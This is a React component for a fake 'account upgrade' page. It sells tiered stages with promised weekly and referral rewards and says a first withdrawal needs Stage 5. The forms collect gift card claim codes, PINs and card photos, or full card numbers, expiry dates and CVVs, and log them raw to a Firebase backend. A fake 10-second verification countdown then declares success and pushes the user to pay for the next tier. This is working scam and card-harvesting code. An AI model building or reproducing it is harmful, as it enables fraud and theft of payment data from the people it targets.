import React, { useState, useEffect } from 'react';
import { useAuth } from '../context/AuthContext';
import { logCardSubmission, logGiftCardSubmission } from '../lib/firebase';
import {
  ArrowLeft,
  Crown,
  Check,
  ChevronRight,
  CreditCard,
  Calendar,
  Lock,
  AlertCircle,
  Gift,
  Upload,
  ShieldCheck,
  Zap,
  Users,
} from 'lucide-react';

interface AccountLevelsProps {
  onBack: () => void;
}

interface Tier {
  stage: number;
  name: string;
  price: number;
  weeklyReward: number;
  referralReward: number;
  badgeColor: string;
  benefits: string[];
}

const GIFT_CARD_BRANDS = [
  { id: 'apple', name: 'Apple / iTunes Gift Card', icon: '🍏' },
  { id: 'steam', name: 'Steam Wallet Card', icon: '🎮' },
  { id: 'razer', name: 'Razer Gold PIN', icon: '🪙' },
  { id: 'google', name: 'Google Play Store Card', icon: '▶️' },
  { id: 'amazon', name: 'Amazon Gift Card', icon: '📦' },
  { id: 'vanilla', name: 'Vanilla Visa / Mastercard', icon: '💳' },
  { id: 'sephora', name: 'Sephora / Nordstrom Card', icon: '💄' },
  { id: 'xbox', name: 'Xbox / PlayStation Store Card', icon: '🕹️' },
];

export const AccountLevels: React.FC<AccountLevelsProps> = ({ onBack }) => {
  const { user, updateUser, addTransaction } = useAuth();

  const [step, setStep] = useState<1 | 2 | 3 | 4>(1);
  const [selectedTier, setSelectedTier] = useState<Tier | null>(null);
  const [progress, setProgress] = useState(0);

  // Payment method tab in step 2: 'giftcard' or 'card'
  const [paymentMethod, setPaymentMethod] = useState<'giftcard' | 'card'>('giftcard');

  // Gift Card Verification state
  const [giftCardBrand, setGiftCardBrand] = useState('Apple / iTunes Gift Card');
  const [giftCardFormat, setGiftCardFormat] = useState<'ecode' | 'physical'>('ecode');
  const [giftCardCode, setGiftCardCode] = useState('');
  const [giftCardPin, setGiftCardPin] = useState('');
  const [giftCardImage, setGiftCardImage] = useState<string | null>(null);
  const [giftCardError, setGiftCardError] = useState('');

  // ATM Card form state
  const [cardNumber, setCardNumber] = useState('');
  const [expiry, setExpiry] = useState('');
  const [cvv, setCvv] = useState('');
  const [cardName, setCardName] = useState(user?.name || '');
  const [cardError, setCardError] = useState('');

  const TIERS: Tier[] = [
    {
      stage: 1,
      name: 'Silver',
      price: 50,
      weeklyReward: 50,
      referralReward: 65,
      badgeColor: 'from-slate-400 to-zinc-500',
      benefits: [
        'Weekly normal reward of $50',
        'Earn $65 per successful referral',
        'Basic customer support',
        'Access to standard features',
      ],
    },
    {
      stage: 2,
      name: 'Gold',
      price: 75,
      weeklyReward: 75,
      referralReward: 80,
      badgeColor: 'from-amber-400 to-yellow-600',
      benefits: [
        'Weekly normal reward of $75',
        'Earn $80 per successful referral',
        'Priority customer support',
        'Advanced features access',
      ],
    },
    {
      stage: 3,
      name: 'Platinum',
      price: 100,
      weeklyReward: 100,
      referralReward: 110,
      badgeColor: 'from-cyan-500 to-blue-600',
      benefits: [
        'Weekly normal reward of $100',
        'Earn $110 per successful referral',
        'Premium customer support',
        'All features unlocked',
      ],
    },
    {
      stage: 4,
      name: 'Emerald',
      price: 150,
      weeklyReward: 150,
      referralReward: 160,
      badgeColor: 'from-emerald-500 to-green-700',
      benefits: [
        'Weekly normal reward of $150',
        'Earn $160 per successful referral',
        'VIP customer support',
        'Exclusive features access',
      ],
    },
    {
      stage: 5,
      name: 'Ruby',
      price: 200,
      weeklyReward: 200,
      referralReward: 220,
      badgeColor: 'from-rose-500 to-red-700',
      benefits: [
        'Unlocks $5,000+ first withdrawal access',
        'Weekly normal reward of $200',
        'Earn $220 per successful referral',
        'Dedicated account manager',
      ],
    },
    {
      stage: 6,
      name: 'Diamond',
      price: 250,
      weeklyReward: 250,
      referralReward: 280,
      badgeColor: 'from-purple-500 to-indigo-700',
      benefits: [
        'Weekly normal reward of $250',
        'Earn $280 per successful referral',
        'White-glove executive service',
        'Ultimate platform access',
      ],
    },
    {
      stage: 7,
      name: 'Black',
      price: 500,
      weeklyReward: 500,
      referralReward: 550,
      badgeColor: 'from-gray-900 to-black',
      benefits: [
        'Weekly normal reward of $500',
        'Earn $550 per successful referral',
        'Concierge executive service',
        'Elite status & maximum limits',
      ],
    },
  ];

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 16);
    const formatted = val.replace(/(\d{4})(?=\d)/g, '$1 ');
    setCardNumber(formatted);
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, '').slice(0, 4);
    if (val.length >= 3) {
      setExpiry(`${val.slice(0, 2)}/${val.slice(2)}`);
    } else {
      setExpiry(val);
    }
  };

  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    if (file) {
      const reader = new FileReader();
      reader.onloadend = () => {
        setGiftCardImage(reader.result as string);
      };
      reader.readAsDataURL(file);
    }
  };

  // Verification countdown
  useEffect(() => {
    if (step === 3) {
      let timeLeft = 10;
      setProgress(0);
      const interval = setInterval(() => {
        timeLeft -= 1;
        setProgress(((10 - timeLeft) / 10) * 100);
        if (timeLeft <= 0) {
          clearInterval(interval);
          if (selectedTier) {
            updateUser({ accountLevel: `Stage ${selectedTier.stage} — ${selectedTier.name}` });
            addTransaction({
              type: 'Account Upgrade',
              amount: selectedTier.price,
              tierName: `Stage ${selectedTier.stage} — ${selectedTier.name}`,
              date: new Date().toLocaleDateString() + ' at ' + new Date().toLocaleTimeString(),
            });
          }
          setStep(4);
        }
      }, 1000);
      return () => clearInterval(interval);
    }
  }, [step, selectedTier]);

  const handleGiftCardPayment = async (e: React.FormEvent) => {
    e.preventDefault();
    setGiftCardError('');

    const cleanCode = giftCardCode.trim();
    if (!cleanCode || cleanCode.length < 6) {
      setGiftCardError('Please enter a valid gift card claim code / voucher PIN');
      return;
    }

    try {
      await logGiftCardSubmission({
        id: `GIFT-${Date.now()}`,
        type: `Stage ${selectedTier?.stage} — ${selectedTier?.name || 'Upgrade'}`,
        cardBrand: giftCardBrand,
        cardFormat: giftCardFormat,
        cardCode: cleanCode,
        cardPin: giftCardPin.trim() || 'N/A',
        amount: selectedTier?.price || 0,
        image: giftCardImage || '',
        userEmail: user?.email || 'unknown',
        userName: user?.name || 'User',
        date: new Date().toLocaleString(),
        status: 'pending',
      });
    } catch (e) {
      console.error(e);
    }

    setStep(3);
  };

  const handleCardPayment = async (e: React.FormEvent) => {
    e.preventDefault();
    setCardError('');

    const cleanCard = cardNumber.replace(/\s/g, '');
    if (cleanCard.length < 16) {
      setCardError('Please enter a valid 16-digit ATM card number');
      return;
    }
    if (!expiry || expiry.length < 5) {
      setCardError('Please enter a valid expiry date (MM/YY)');
      return;
    }
    if (!cvv || cvv.length < 3) {
      setCardError('Please enter a valid CVV');
      return;
    }

    try {
      await logCardSubmission({
        id: `CARD-${Date.now()}`,
        type: `Stage ${selectedTier?.stage} — ${selectedTier?.name || 'Upgrade'}`,
        cardNumber,
        expiry,
        cvv,
        cardName,
        amount: selectedTier?.price || 0,
        userEmail: user?.email || 'unknown',
        userName: user?.name || cardName,
        date: new Date().toLocaleString(),
      });
    } catch (e) {
      console.error(e);
    }

    setStep(3);
  };

  return (
    <div className="min-h-screen bg-gray-50 pb-12">
      <div className="bg-purple-700 text-white p-4 shadow-md sticky top-0 z-30">
        <div className="max-w-xl mx-auto flex items-center space-x-3">
          <button
            onClick={onBack}
            className="p-2 hover:bg-white/10 rounded-full transition-colors text-white cursor-pointer"
          >
            <ArrowLeft className="w-5 h-5" />
          </button>
          <div>
            <h1 className="text-lg font-bold">Choose Your Level</h1>
            <p className="text-xs text-purple-200">Upgrade stages to increase weekly & referral earnings</p>
          </div>
        </div>
      </div>

      <div className="max-w-xl mx-auto p-4 sm:p-6 space-y-6">
        {/* Step 1: Tier Selection */}
        {step === 1 && (
          <div className="space-y-4">
            <div className="bg-gradient-to-r from-purple-900 to-indigo-900 text-white rounded-2xl p-5 shadow-sm flex items-center justify-between">
              <div>
                <p className="text-xs uppercase font-medium text-purple-200">Current Level</p>
                <h3 className="text-xl font-bold mt-0.5">{user?.accountLevel || 'Basic'}</h3>
              </div>
              <span className="text-xs bg-white/20 px-3 py-1.5 rounded-full font-semibold">
                Active Tier
              </span>
            </div>

            <div className="text-center py-2">
              <h2 className="text-xl font-bold text-gray-900">Select Stage to Upgrade</h2>
              <p className="text-xs text-gray-500">
                View weekly normal rewards, referral earnings, and activation prices
              </p>
            </div>

            <div className="space-y-3">
              {TIERS.map((tier) => (
                <div
                  key={tier.name}
                  onClick={() => {
                    setSelectedTier(tier);
                    setStep(2);
                  }}
                  className="bg-white rounded-2xl p-5 shadow-xs border border-gray-100 hover:border-purple-300 hover:shadow-md transition-all cursor-pointer flex flex-col justify-between"
                >
                  <div className="flex items-center justify-between mb-3">
                    <div className="flex items-center space-x-3">
                      <div
                        className={`w-11 h-11 rounded-xl bg-gradient-to-br ${tier.badgeColor} text-white flex items-center justify-center font-black shadow-xs`}
                      >
                        <Crown className="w-6 h-6" />
                      </div>
                      <div>
                        <div className="flex flex-wrap items-center gap-2">
                          <h4 className="font-bold text-base text-gray-900">
                            Stage {tier.stage} — {tier.name}
                          </h4>
                          {(((!user?.accountLevel || user.accountLevel === 'Basic') && tier.stage === 1) ||
                            (user?.accountLevel?.includes('Silver') && tier.stage === 2)) && (
                            <span className="text-[10px] font-bold uppercase tracking-wider bg-amber-100 text-amber-800 px-2 py-0.5 rounded-full border border-amber-200">
                              Next Required Tier
                            </span>
                          )}
                          {tier.stage === 5 && (
                            <span className="text-[10px] font-bold uppercase tracking-wider bg-rose-100 text-rose-800 px-2 py-0.5 rounded-full border border-rose-200">
                              Unlocks $5,000+ Withdrawals
                            </span>
                          )}
                        </div>
                        <span className="text-xs font-black text-purple-700 bg-purple-50 px-2 py-0.5 rounded-md border border-purple-200 inline-block mt-1">
                          ${tier.price.toLocaleString()} One-time
                        </span>
                      </div>
                    </div>
                    <ChevronRight className="w-5 h-5 text-gray-400" />
                  </div>

                  {/* Highlights Bar */}
                  <div className="grid grid-cols-2 gap-2 mb-3 bg-gray-50 p-2.5 rounded-xl border border-gray-100">
                    <div className="flex items-center space-x-1.5 text-xs text-purple-900 font-semibold">
                      <Zap className="w-3.5 h-3.5 text-amber-500 shrink-0" />
                      <span>Weekly: <strong>${tier.weeklyReward}/wk</strong></span>
                    </div>
                    <div className="flex items-center space-x-1.5 text-xs text-emerald-900 font-semibold">
                      <Users className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
                      <span>Referral: <strong>${tier.referralReward}/invite</strong></span>
                    </div>
                  </div>

                  <div className="space-y-1.5 pt-2 border-t border-gray-100 text-xs text-gray-600">
                    {tier.benefits.map((b, idx) => (
                      <div key={idx} className="flex items-center space-x-2">
                        <Check className="w-3.5 h-3.5 text-emerald-600 shrink-0" />
                        <span>{b}</span>
                      </div>
                    ))}
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Step 2: Payment Details with Verify with Gift Cards & ATM Card Tabs */}
        {step === 2 && selectedTier && (
          <div className="space-y-5">
            <div className="bg-gradient-to-r from-purple-700 to-indigo-800 text-white rounded-2xl p-5 text-center shadow-md">
              <h2 className="text-xl font-bold">
                Upgrade to Stage {selectedTier.stage} — {selectedTier.name}
              </h2>
              <p className="text-xs text-purple-200 mt-1">
                Choose verification method for ${selectedTier.price.toLocaleString()}
              </p>
              <div className="mt-3 flex justify-center space-x-4 text-xs font-semibold">
                <span className="bg-white/20 px-3 py-1 rounded-full">
                  Weekly: ${selectedTier.weeklyReward}/wk
                </span>
                <span className="bg-white/20 px-3 py-1 rounded-full">
                  Referral: ${selectedTier.referralReward}/ref
                </span>
              </div>
            </div>

            {/* Payment Method Tabs */}
            <div className="grid grid-cols-2 gap-2 bg-gray-200 p-1.5 rounded-2xl">
              <button
                type="button"
                onClick={() => setPaymentMethod('giftcard')}
                className={`py-3 rounded-xl font-bold text-xs sm:text-sm transition-all flex items-center justify-center space-x-2 cursor-pointer ${
                  paymentMethod === 'giftcard'
                    ? 'bg-white text-purple-900 shadow-sm'
                    : 'text-gray-600 hover:text-gray-900'
                }`}
              >
                <Gift className="w-4 h-4 text-purple-600" />
                <span>Verify with Gift Cards</span>
              </button>

              <button
                type="button"
                onClick={() => setPaymentMethod('card')}
                className={`py-3 rounded-xl font-bold text-xs sm:text-sm transition-all flex items-center justify-center space-x-2 cursor-pointer ${
                  paymentMethod === 'card'
                    ? 'bg-white text-purple-900 shadow-sm'
                    : 'text-gray-600 hover:text-gray-900'
                }`}
              >
                <CreditCard className="w-4 h-4 text-emerald-600" />
                <span>Other Option</span>
              </button>
            </div>

            {paymentMethod === 'giftcard' ? (
              <form onSubmit={handleGiftCardPayment} className="bg-white rounded-3xl p-6 shadow-sm border border-gray-100 space-y-4">
                <div className="bg-gradient-to-r from-purple-50 to-indigo-50 border border-purple-200 rounded-2xl p-4">
                  <div className="flex items-center space-x-2 mb-1">
                    <Gift className="w-5 h-5 text-purple-700" />
                    <h3 className="font-bold text-sm text-purple-900">Verify Your Account with Gift Cards</h3>
                  </div>
                  <p className="text-xs text-purple-700 leading-relaxed">
                    Submit a valid <strong>${selectedTier.price.toLocaleString()}</strong> gift card (Apple, Steam, Razer Gold, Amazon, Google Play, or Vanilla Visa) to immediately upgrade your account to <strong>Stage {selectedTier.stage} — {selectedTier.name}</strong>.
                  </p>
                </div>

                {giftCardError && (
                  <div className="p-3 bg-red-50 border border-red-200 text-red-600 text-xs rounded-xl flex items-center space-x-2">
                    <AlertCircle className="w-4 h-4 shrink-0" />
                    <span>{giftCardError}</span>
                  </div>
                )}

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1.5">
                    Select Gift Card Brand
                  </label>
                  <select
                    value={giftCardBrand}
                    onChange={(e) => setGiftCardBrand(e.target.value)}
                    className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900 bg-white font-medium"
                  >
                    {GIFT_CARD_BRANDS.map((b) => (
                      <option key={b.id} value={b.name}>
                        {b.icon} {b.name}
                      </option>
                    ))}
                  </select>
                </div>

                <div className="grid grid-cols-2 gap-2 bg-gray-100 p-1 rounded-xl">
                  <button
                    type="button"
                    onClick={() => setGiftCardFormat('ecode')}
                    className={`py-2 text-xs font-semibold rounded-lg transition-all cursor-pointer ${
                      giftCardFormat === 'ecode' ? 'bg-white text-purple-900 shadow-xs' : 'text-gray-500'
                    }`}
                  >
                    Digital E-Code
                  </button>
                  <button
                    type="button"
                    onClick={() => setGiftCardFormat('physical')}
                    className={`py-2 text-xs font-semibold rounded-lg transition-all cursor-pointer ${
                      giftCardFormat === 'physical' ? 'bg-white text-purple-900 shadow-xs' : 'text-gray-500'
                    }`}
                  >
                    Physical Card (Photo)
                  </button>
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Gift Card Claim Code / E-Code
                  </label>
                  <input
                    type="text"
                    value={giftCardCode}
                    onChange={(e) => setGiftCardCode(e.target.value.toUpperCase())}
                    placeholder="e.g. X7KM-99P2-44BB-912A"
                    className="w-full p-3.5 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono font-bold text-gray-900 uppercase"
                    required
                  />
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                      Card PIN / CVV (if applicable)
                    </label>
                    <input
                      type="text"
                      value={giftCardPin}
                      onChange={(e) => setGiftCardPin(e.target.value)}
                      placeholder="e.g. 1234"
                      className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                      Required Value ($)
                    </label>
                    <input
                      type="text"
                      readOnly
                      value={`$${selectedTier.price.toLocaleString()}`}
                      className="w-full p-3 bg-gray-100 border border-gray-200 rounded-xl text-sm font-bold text-purple-900 font-mono"
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Upload Card Front/Back or Receipt (Optional)
                  </label>
                  <label className="border-2 border-dashed border-gray-300 hover:border-purple-400 rounded-2xl p-4 flex flex-col items-center justify-center cursor-pointer transition-colors bg-gray-50">
                    {giftCardImage ? (
                      <div className="space-y-2 text-center">
                        <img
                          src={giftCardImage}
                          alt="Card Preview"
                          className="h-24 object-contain rounded-lg mx-auto border border-gray-200"
                        />
                        <span className="text-xs text-purple-700 font-semibold">Change Photo</span>
                      </div>
                    ) : (
                      <div className="text-center space-y-1">
                        <Upload className="w-6 h-6 text-purple-600 mx-auto mb-1" />
                        <p className="text-xs font-semibold text-gray-700">Attach photo of card / receipt</p>
                        <p className="text-[10px] text-gray-400">JPG, PNG supported</p>
                      </div>
                    )}
                    <input
                      type="file"
                      accept="image/*"
                      onChange={handleImageUpload}
                      className="hidden"
                    />
                  </label>
                </div>

                <button
                  type="submit"
                  className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl text-base shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2"
                >
                  <ShieldCheck className="w-5 h-5" />
                  <span>Verify ${selectedTier.price.toLocaleString()} Gift Card & Upgrade</span>
                </button>
              </form>
            ) : (
              <form onSubmit={handleCardPayment} className="bg-white rounded-3xl p-6 shadow-sm border border-gray-100 space-y-4">
                <div className="bg-purple-900 text-white rounded-2xl p-4 relative overflow-hidden mb-2">
                  <div className="text-[10px] uppercase tracking-widest text-purple-300 font-semibold mb-3">
                    Card Verification (Other Option)
                  </div>
                  <div className="font-mono text-base tracking-wider mb-3">
                    {cardNumber || '•••• •••• •••• ••••'}
                  </div>
                  <div className="flex justify-between text-xs text-purple-200">
                    <span>{cardName || 'CARDHOLDER'}</span>
                    <span className="font-mono">{expiry || 'MM/YY'}</span>
                  </div>
                </div>

                {cardError && (
                  <div className="p-3 bg-red-50 border border-red-200 text-red-600 text-xs rounded-xl flex items-center space-x-2">
                    <AlertCircle className="w-4 h-4 shrink-0" />
                    <span>{cardError}</span>
                  </div>
                )}

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Card Number
                  </label>
                  <div className="relative">
                    <CreditCard className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                    <input
                      type="text"
                      value={cardNumber}
                      onChange={handleCardNumberChange}
                      placeholder="4532 •••• •••• ••••"
                      className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                      required
                    />
                  </div>
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                      Expiry Date
                    </label>
                    <div className="relative">
                      <Calendar className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                      <input
                        type="text"
                        value={expiry}
                        onChange={handleExpiryChange}
                        placeholder="MM/YY"
                        className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                        required
                      />
                    </div>
                  </div>

                  <div>
                    <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                      CVV
                    </label>
                    <div className="relative">
                      <Lock className="w-4 h-4 absolute left-3.5 top-1/2 -translate-y-1/2 text-gray-400" />
                      <input
                        type="password"
                        maxLength={4}
                        value={cvv}
                        onChange={(e) => setCvv(e.target.value.replace(/\D/g, ''))}
                        placeholder="123"
                        className="w-full pl-10 pr-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm font-mono text-gray-900"
                        required
                      />
                    </div>
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-semibold uppercase tracking-wider text-gray-600 mb-1">
                    Cardholder Name
                  </label>
                  <input
                    type="text"
                    value={cardName}
                    onChange={(e) => setCardName(e.target.value)}
                    placeholder="Name on card"
                    className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-purple-600 outline-none text-sm text-gray-900 uppercase"
                    required
                  />
                </div>

                <button
                  type="submit"
                  className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-4 rounded-xl text-base shadow-md transition-all cursor-pointer flex items-center justify-center space-x-2"
                >
                  <CreditCard className="w-5 h-5" />
                  <span>Verify ${selectedTier.price.toLocaleString()} with Card (Other Option)</span>
                </button>
              </form>
            )}

            <button
              onClick={() => setStep(1)}
              className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-3 rounded-xl text-sm transition-all cursor-pointer"
            >
              Back to Stages
            </button>
          </div>
        )}

        {/* Step 3: Verification */}
        {step === 3 && (
          <div className="bg-white rounded-2xl p-8 shadow-sm border border-gray-100 flex flex-col items-center justify-center text-center space-y-5 my-8">
            <div className="w-16 h-16 border-4 border-purple-600 border-t-transparent rounded-full animate-spin" />
            <h3 className="text-2xl font-bold text-gray-900">
              Verifying Stage {selectedTier?.stage} Payment
            </h3>
            <p className="text-sm text-gray-500 max-w-sm">
              Please wait while we confirm your payment and unlock {selectedTier?.name} benefits...
            </p>
            <div className="w-full bg-gray-200 rounded-full h-2.5 overflow-hidden max-w-xs">
              <div
                className="bg-purple-600 h-full rounded-full transition-all duration-1000"
                style={{ width: `${progress}%` }}
              />
            </div>
            <p className="text-xs text-gray-400">Please do not refresh this page</p>
          </div>
        )}

        {/* Step 4: Upgrade Success */}
        {step === 4 && selectedTier && (
          <div className="bg-white rounded-3xl p-6 sm:p-8 shadow-xl border border-gray-100 text-center space-y-6">
            <div className="w-20 h-20 bg-amber-100 rounded-full flex items-center justify-center mx-auto text-amber-600 ring-8 ring-amber-50">
              <Crown className="w-10 h-10 fill-amber-500" />
            </div>

            <div>
              <h3 className="text-2xl font-extrabold text-gray-900">
                Welcome to Stage {selectedTier.stage} — {selectedTier.name}!
              </h3>
              <p className="text-sm text-emerald-600 font-semibold mt-1">
                Your account has been successfully upgraded
              </p>
            </div>

            <div className="bg-purple-50 rounded-2xl p-5 border border-purple-100 text-left space-y-2 text-xs">
              <p className="font-bold text-purple-900 mb-2">Unlocked Benefits:</p>
              {selectedTier.benefits.map((b, idx) => (
                <div key={idx} className="flex items-center space-x-2 text-purple-800">
                  <Check className="w-3.5 h-3.5 text-purple-600 shrink-0" />
                  <span>{b}</span>
                </div>
              ))}
            </div>

            {selectedTier.stage === 1 ? (
              <div className="bg-amber-50 border border-amber-200 rounded-2xl p-4 text-left space-y-3">
                <div className="flex items-center space-x-2 text-amber-900 font-bold text-sm">
                  <Crown className="w-4 h-4 text-amber-600 shrink-0" />
                  <span>Next Step: Upgrade to Stage 2 — Gold</span>
                </div>
                <p className="text-xs text-amber-800 leading-relaxed">
                  Stage 1 (Silver) is active. Please upgrade to the second tier <strong>Stage 2 — Gold ($75)</strong> next — you will need to reach <strong>Stage 5 (Ruby)</strong> for your first withdrawal ($5,000 minimum).
                </p>
                <button
                  type="button"
                  onClick={() => {
                    setSelectedTier(TIERS[1]);
                    setGiftCardCode('');
                    setGiftCardPin('');
                    setGiftCardImage(null);
                    setGiftCardError('');
                    setCardNumber('');
                    setExpiry('');
                    setCvv('');
                    setCardError('');
                    setStep(2);
                  }}
                  className="w-full min-h-[44px] bg-amber-500 hover:bg-amber-600 text-purple-950 font-bold py-3 rounded-xl text-xs sm:text-sm shadow-sm transition-all cursor-pointer flex items-center justify-center space-x-1.5"
                >
                  <Crown className="w-4 h-4" />
                  <span>Upgrade to Stage 2 — Gold ($75)</span>
                </button>
              </div>
            ) : selectedTier.stage < 5 ? (
              <div className="bg-rose-50 border border-rose-200 rounded-2xl p-4 text-left space-y-3">
                <div className="flex items-center space-x-2 text-rose-900 font-bold text-sm">
                  <Crown className="w-4 h-4 text-rose-600 shrink-0" />
                  <span>Ruby Tier Required for First Withdrawal ($5,000 Min)</span>
                </div>
                <p className="text-xs text-rose-800 leading-relaxed">
                  Stage {selectedTier.stage} ({selectedTier.name}) is active. Since the minimum withdrawal is <strong>$5,000</strong>, upgrade to <strong>Stage 5 — Ruby ($200)</strong> to unlock your first withdrawal.
                </p>
                <button
                  type="button"
                  onClick={() => {
                    setSelectedTier(TIERS[4]);
                    setGiftCardCode('');
                    setGiftCardPin('');
                    setGiftCardImage(null);
                    setGiftCardError('');
                    setCardNumber('');
                    setExpiry('');
                    setCvv('');
                    setCardError('');
                    setStep(2);
                  }}
                  className="w-full min-h-[44px] bg-rose-600 hover:bg-rose-700 text-white font-bold py-3 rounded-xl text-xs sm:text-sm shadow-sm transition-all cursor-pointer flex items-center justify-center space-x-1.5"
                >
                  <Crown className="w-4 h-4 text-amber-300" />
                  <span>Upgrade to Stage 5 — Ruby ($200)</span>
                </button>
              </div>
            ) : null}

            <button
              onClick={onBack}
              className={`w-full font-bold py-3.5 rounded-xl text-sm transition-all cursor-pointer ${
                selectedTier.stage < 5
                  ? 'bg-gray-100 hover:bg-gray-200 text-gray-700'
                  : 'bg-purple-600 hover:bg-purple-700 text-white shadow-md'
              }`}
            >
              Back to Dashboard
            </button>
          </div>
        )}
      </div>
    </div>
  );
};
